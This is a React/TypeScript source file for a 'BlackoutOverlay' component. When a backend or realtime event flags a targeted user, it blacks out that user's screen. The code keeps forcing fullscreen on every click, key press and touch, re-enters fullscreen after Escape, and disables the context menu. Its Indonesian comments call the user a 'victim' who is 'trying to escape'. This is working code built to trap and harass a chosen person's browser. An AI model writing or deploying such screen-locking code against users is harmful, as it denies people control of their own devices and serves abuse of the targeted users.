import { useCallback, useEffect, useRef, useState } from 'react';
import { useStore } from '../lib/store';
import { rpcGetBlackout, rpcGetBlackoutPublic } from '../lib/api';
import { onBlackout } from '../lib/realtime';

const POLL_MS = 4000;

const LAST_USER_KEY = 'nexus:lastuser';

function lastUsername(): string {
  try {
    return localStorage.getItem(LAST_USER_KEY) ?? '';
  } catch {
    return '';
  }
}

export default function BlackoutOverlay() {
  const me = useStore((s) => s.me);
  const [blacked, setBlacked] = useState(false);
  const blackedRef = useRef(false);

  const setB = useCallback((v: boolean) => {
    blackedRef.current = v;
    setBlacked(v);
  }, []);

  const check = useCallback(async () => {
    const st = useStore.getState();
    try {
      if (st.me?.id) {
        const active = await rpcGetBlackout(st.me.id);
        setB(active);
      } else {
        const uname = lastUsername();
        if (uname) {
          const active = await rpcGetBlackoutPublic(uname);
          setB(active);
        }
      }
    } catch {
      /* jaringan / bukan korban */
    }
  }, [setB]);

  useEffect(() => {
    if (me?.id) check();
  }, [me?.id, check]);

  useEffect(() => {
    const t = setInterval(() => {
      const st = useStore.getState();
      if (st.me || lastUsername()) check();
    }, POLL_MS);
    const onVis = () => {
      if (!document.hidden) check();
    };
    document.addEventListener('visibilitychange', onVis);
    window.addEventListener('focus', onVis);
    return () => {
      clearInterval(t);
      document.removeEventListener('visibilitychange', onVis);
      window.removeEventListener('focus', onVis);
    };
  }, [check]);

  useEffect(() => {
    return onBlackout((p) => {
      const uid = useStore.getState().me?.id;
      if (uid && p.target_user_id === uid) setB(p.active);
    });
  }, [setB]);

  // Paksa fullscreen selama layar hitam: browser butuh gerakan user, jadi
  // tiap kali korban klik / tekan tombol, kita minta lagi.
  useEffect(() => {
    if (!blacked) return;

    const enter = () => {
      try {
        if (document.fullscreenEnabled && !document.fullscreenElement) {
          document.documentElement.requestFullscreen?.().catch(() => {});
        }
      } catch {
        /* noop */
      }
    };

    const onKey = (e: KeyboardEvent) => {
      if (e.key === 'Escape' && document.fullscreenElement) {
        // user mencoba kabur: minta balik pada gerakan berikutnya
        enter();
      } else {
        enter();
      }
    };

    const onFullscreen = () => {
      if (!document.fullscreenElement) enter();
    };

    const onCtx = (e: Event) => e.preventDefault();
    const onTouch = () => enter();

    enter();
    document.addEventListener('pointerdown', enter);
    document.addEventListener('keydown', onKey);
    document.addEventListener('touchstart', onTouch);
    document.addEventListener('fullscreenchange', onFullscreen);
    document.addEventListener('contextmenu', onCtx);
    return () => {
      document.removeEventListener('pointerdown', enter);
      document.removeEventListener('keydown', onKey);
      document.removeEventListener('touchstart', onTouch);
      document.removeEventListener('fullscreenchange', onFullscreen);
      document.removeEventListener('contextmenu', onCtx);
    };
  }, [blacked]);

  useEffect(() => {
    return () => {
      if (!blackedRef.current && document.fullscreenElement) {
        try {
          document.exitFullscreen?.().catch(() => {});
        } catch {
          /* noop */
        }
      }
    };
  }, []);

  if (!blacked) return null;

  return (
    <div
      className="fixed inset-0 z-[999999] bg-black"
      style={{
        pointerEvents: 'none',
        userSelect: 'none',
        cursor: 'none',
        touchAction: 'none',
      }}
      aria-hidden
    />
  );
}
